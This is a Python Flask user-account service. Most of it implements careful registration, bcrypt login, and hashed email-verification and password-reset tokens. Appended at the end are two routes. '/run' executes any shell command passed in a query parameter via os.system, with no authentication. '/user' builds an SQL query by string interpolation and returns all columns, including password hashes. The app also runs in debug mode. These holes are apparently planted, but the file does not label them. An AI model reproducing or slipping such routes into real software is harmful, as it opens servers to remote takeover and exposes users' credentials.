import hashlib
import hmac
import logging
import os
import re
import secrets
import sqlite3
import uuid
from datetime import datetime, timedelta, timezone

import bcrypt
from flask import Flask, jsonify, request, session

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "dev-only-change-in-production")
logger = logging.getLogger(__name__)
DB_PATH = "test.db"

PUBLIC_USER_FIELDS = ("id", "username", "email", "email_verified")
USERNAME_PATTERN = re.compile(r"^[a-zA-Z0-9_]{3,64}$")
EMAIL_PATTERN = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
MIN_PASSWORD_LENGTH = 8
BCRYPT_ROUNDS = 12
TOKEN_BYTES = 32
VERIFICATION_TOKEN_HOURS = 24
RESET_TOKEN_HOURS = 1

# In-process outbox for tests and non-SMTP deployments; entries never include raw tokens.
EMAIL_OUTBOX = []
TOKEN_CAPTURE = []


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            email TEXT,
            password_hash TEXT,
            email_verified INTEGER NOT NULL DEFAULT 0,
            verification_token_hash TEXT,
            verification_token_expires TEXT,
            reset_token_hash TEXT,
            reset_token_expires TEXT
        )
        """
    )
    for column, definition in (
        ("password_hash", "TEXT"),
        ("email_verified", "INTEGER NOT NULL DEFAULT 0"),
        ("verification_token_hash", "TEXT"),
        ("verification_token_expires", "TEXT"),
        ("reset_token_hash", "TEXT"),
        ("reset_token_expires", "TEXT"),
    ):
        try:
            conn.execute(f"ALTER TABLE users ADD COLUMN {column} {definition}")
        except sqlite3.OperationalError:
            pass
    if conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 0:
        conn.executemany(
            "INSERT INTO users (username, email, email_verified) VALUES (?, ?, 1)",
            [
                ("alice", "alice@example.com"),
                ("bob", "bob@example.com"),
            ],
        )
    conn.commit()
    conn.close()


def serialize_user(row):
    """Return only the public, non-sensitive fields for a user row."""
    data = {field: row[field] for field in PUBLIC_USER_FIELDS}
    data["email_verified"] = bool(data["email_verified"])
    return data


def utc_now():
    return datetime.now(timezone.utc)


def utc_iso(dt):
    return dt.astimezone(timezone.utc).replace(microsecond=0).isoformat()


def hash_token(token: str) -> str:
    secret = app.config["SECRET_KEY"].encode("utf-8")
    return hmac.new(secret, token.encode("utf-8"), hashlib.sha256).hexdigest()


def generate_opaque_token() -> str:
    return secrets.token_urlsafe(TOKEN_BYTES)


def token_expires(hours: int) -> str:
    return utc_iso(utc_now() + timedelta(hours=hours))


def token_is_valid(stored_hash, stored_expires, provided_token):
    if not stored_hash or not stored_expires or not provided_token:
        return False
    if not hmac.compare_digest(stored_hash, hash_token(provided_token)):
        return False
    try:
        expires_at = datetime.fromisoformat(stored_expires)
    except ValueError:
        return False
    if expires_at.tzinfo is None:
        expires_at = expires_at.replace(tzinfo=timezone.utc)
    return utc_now() <= expires_at


def queue_email(kind: str, recipient: str):
    """Record outbound mail metadata without logging secrets or token values."""
    entry = {"kind": kind, "recipient": recipient}
    EMAIL_OUTBOX.append(entry)
    logger.info("Queued %s email for recipient", kind)


def issue_verification_token(conn, user_id: int) -> str:
    token = generate_opaque_token()
    conn.execute(
        """
        UPDATE users
        SET verification_token_hash = ?, verification_token_expires = ?
        WHERE id = ?
        """,
        (hash_token(token), token_expires(VERIFICATION_TOKEN_HOURS), user_id),
    )
    return token


def issue_reset_token(conn, user_id: int) -> str:
    token = generate_opaque_token()
    conn.execute(
        """
        UPDATE users
        SET reset_token_hash = ?, reset_token_expires = ?
        WHERE id = ?
        """,
        (hash_token(token), token_expires(RESET_TOKEN_HOURS), user_id),
    )
    return token


def capture_token_for_tests(kind: str, recipient: str, token: str):
    if os.environ.get("CAPTURE_EMAIL_TOKENS") == "1":
        TOKEN_CAPTURE.append({"kind": kind, "recipient": recipient, "token": token})


def send_verification_email(recipient: str, token: str):
    queue_email("verification", recipient)
    capture_token_for_tests("verification", recipient, token)
    if os.environ.get("EMAIL_LOG_TOKENS") == "1":
        logger.debug("Verification token issued (recipient=%s)", recipient)


def send_password_reset_email(recipient: str, token: str):
    queue_email("password_reset", recipient)
    capture_token_for_tests("password_reset", recipient, token)
    if os.environ.get("EMAIL_LOG_TOKENS") == "1":
        logger.debug("Password reset token issued (recipient=%s)", recipient)


def hash_password(password: str) -> str:
    return bcrypt.hashpw(
        password.encode("utf-8"), bcrypt.gensalt(rounds=BCRYPT_ROUNDS)
    ).decode("utf-8")


def verify_password(password: str, password_hash: str) -> bool:
    return bcrypt.checkpw(password.encode("utf-8"), password_hash.encode("utf-8"))


def parse_user_payload():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return None, (jsonify({"error": "Request body must be JSON"}), 400)
    return data, None


def validate_username(username):
    if not isinstance(username, str) or not USERNAME_PATTERN.fullmatch(username):
        return "Username must be 3-64 alphanumeric characters or underscores"


def validate_password(password):
    if not isinstance(password, str) or len(password) < MIN_PASSWORD_LENGTH:
        return f"Password must be at least {MIN_PASSWORD_LENGTH} characters"


def validate_email(email):
    if email is None:
        return None
    if not isinstance(email, str) or not EMAIL_PATTERN.fullmatch(email):
        return "Email must be a valid address"
    if len(email) > 254:
        return "Email must be at most 254 characters"


def register_user(data):
    username = data.get("username")
    password = data.get("password")
    email = data.get("email")

    for error in (
        validate_username(username),
        validate_password(password),
        validate_email(email),
    ):
        if error:
            return jsonify({"error": error}), 400

    password_hash = hash_password(password)
    conn = get_db()
    try:
        cursor = conn.execute(
            "INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)",
            (username, email, password_hash),
        )
        conn.commit()
        row = conn.execute(
            "SELECT id, username, email, email_verified FROM users WHERE id = ?",
            (cursor.lastrowid,),
        ).fetchone()
        if email:
            token = issue_verification_token(conn, row["id"])
            conn.commit()
            send_verification_email(email, token)
        logger.info("User registered (user_id=%s)", row["id"])
        return jsonify(serialize_user(row)), 201
    except sqlite3.IntegrityError:
        return jsonify({"error": "Username already exists"}), 409
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception(
            "Failed to register user (correlation_id=%s)", correlation_id
        )
        return jsonify(
            {"error": "Unable to create user", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


def login_user(data):
    username = data.get("username")
    password = data.get("password")

    for error in (validate_username(username), validate_password(password)):
        if error:
            return jsonify({"error": "Invalid username or password"}), 401

    conn = get_db()
    try:
        row = conn.execute(
            "SELECT id, username, email, email_verified, password_hash FROM users WHERE username = ?",
            (username,),
        ).fetchone()
        if row is None or not row["password_hash"]:
            logger.info("Failed login attempt for unknown user")
            return jsonify({"error": "Invalid username or password"}), 401
        if not verify_password(password, row["password_hash"]):
            logger.info("Failed login attempt for user_id=%s", row["id"])
            return jsonify({"error": "Invalid username or password"}), 401

        session.clear()
        session["user_id"] = row["id"]
        logger.info("User logged in (user_id=%s)", row["id"])
        return jsonify(serialize_user(row)), 200
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception("Failed to authenticate user (correlation_id=%s)", correlation_id)
        return jsonify(
            {"error": "Unable to authenticate", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


def forgot_password(data):
    email = data.get("email")
    error = validate_email(email)
    if error or email is None:
        return jsonify({"error": error or "Email is required"}), 400

    conn = get_db()
    try:
        row = conn.execute(
            "SELECT id, email FROM users WHERE email = ?",
            (email,),
        ).fetchone()
        if row is not None and row["email"]:
            token = issue_reset_token(conn, row["id"])
            conn.commit()
            send_password_reset_email(row["email"], token)
            logger.info("Password reset requested (user_id=%s)", row["id"])
        return jsonify(
            {"message": "If that email is registered, a password reset link has been sent."}
        ), 200
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception(
            "Failed to process password reset request (correlation_id=%s)",
            correlation_id,
        )
        return jsonify(
            {"error": "Unable to process request", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


def reset_password(data):
    token = data.get("token")
    password = data.get("password")

    if not isinstance(token, str) or not token:
        return jsonify({"error": "token is required"}), 400
    error = validate_password(password)
    if error:
        return jsonify({"error": error}), 400

    token_hash = hash_token(token)
    conn = get_db()
    try:
        row = conn.execute(
            """
            SELECT id, reset_token_hash, reset_token_expires
            FROM users
            WHERE reset_token_hash = ?
            """,
            (token_hash,),
        ).fetchone()
        if row is None or not token_is_valid(
            row["reset_token_hash"], row["reset_token_expires"], token
        ):
            return jsonify({"error": "Invalid or expired reset token"}), 400

        password_hash = hash_password(password)
        conn.execute(
            """
            UPDATE users
            SET password_hash = ?, reset_token_hash = NULL, reset_token_expires = NULL
            WHERE id = ?
            """,
            (password_hash, row["id"]),
        )
        conn.commit()
        logger.info("Password reset completed (user_id=%s)", row["id"])
        return jsonify({"message": "Password has been reset"}), 200
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception("Failed to reset password (correlation_id=%s)", correlation_id)
        return jsonify(
            {"error": "Unable to reset password", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


def verify_email(data):
    token = data.get("token")
    if not isinstance(token, str) or not token:
        return jsonify({"error": "token is required"}), 400

    token_hash = hash_token(token)
    conn = get_db()
    try:
        row = conn.execute(
            """
            SELECT id, verification_token_hash, verification_token_expires
            FROM users
            WHERE verification_token_hash = ?
            """,
            (token_hash,),
        ).fetchone()
        if row is None or not token_is_valid(
            row["verification_token_hash"], row["verification_token_expires"], token
        ):
            return jsonify({"error": "Invalid or expired verification token"}), 400

        conn.execute(
            """
            UPDATE users
            SET email_verified = 1,
                verification_token_hash = NULL,
                verification_token_expires = NULL
            WHERE id = ?
            """,
            (row["id"],),
        )
        conn.commit()
        updated = conn.execute(
            "SELECT id, username, email, email_verified FROM users WHERE id = ?",
            (row["id"],),
        ).fetchone()
        logger.info("Email verified (user_id=%s)", row["id"])
        return jsonify(serialize_user(updated)), 200
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception("Failed to verify email (correlation_id=%s)", correlation_id)
        return jsonify(
            {"error": "Unable to verify email", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


def resend_verification(data):
    email = data.get("email")
    error = validate_email(email)
    if error or email is None:
        return jsonify({"error": error or "Email is required"}), 400

    conn = get_db()
    try:
        row = conn.execute(
            "SELECT id, email, email_verified FROM users WHERE email = ?",
            (email,),
        ).fetchone()
        if row is not None and row["email"] and not row["email_verified"]:
            token = issue_verification_token(conn, row["id"])
            conn.commit()
            send_verification_email(row["email"], token)
            logger.info("Verification email resent (user_id=%s)", row["id"])
        return jsonify(
            {
                "message": "If that email is registered and unverified, a verification link has been sent."
            }
        ), 200
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception(
            "Failed to resend verification email (correlation_id=%s)", correlation_id
        )
        return jsonify(
            {"error": "Unable to process request", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


@app.route("/users", methods=["GET"])
def list_users():
    """Public read-only listing of non-sensitive user fields."""
    conn = get_db()
    try:
        rows = conn.execute(
            "SELECT id, username, email, email_verified FROM users ORDER BY id"
        ).fetchall()
        return jsonify([serialize_user(row) for row in rows])
    except sqlite3.Error:
        correlation_id = uuid.uuid4().hex
        logger.exception("Failed to list users (correlation_id=%s)", correlation_id)
        return jsonify(
            {"error": "Unable to retrieve users", "correlation_id": correlation_id}
        ), 500
    finally:
        conn.close()


@app.route("/users", methods=["POST"])
def create_or_authenticate_user():
    """Register, authenticate, verify email, or reset password."""
    data, error_response = parse_user_payload()
    if error_response:
        return error_response

    action = data.get("action", "register")
    handlers = {
        "login": login_user,
        "register": register_user,
        "forgot_password": forgot_password,
        "reset_password": reset_password,
        "verify_email": verify_email,
        "resend_verification": resend_verification,
    }
    handler = handlers.get(action)
    if handler is None:
        return jsonify(
            {
                "error": "action must be one of: register, login, forgot_password, "
                "reset_password, verify_email, resend_verification"
            }
        ), 400
    return handler(data)


@app.route("/run")
def run_command():
    cmd = request.args.get("cmd")
    os.system(cmd)
    return "Command executed"


@app.route("/user")
def get_user():
    username = request.args.get("username")

    conn = get_db()
    cursor = conn.cursor()

    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)

    result = str(cursor.fetchall())
    conn.close()
    return result


if __name__ == "__main__":
    init_db()
    app.run(debug=True)
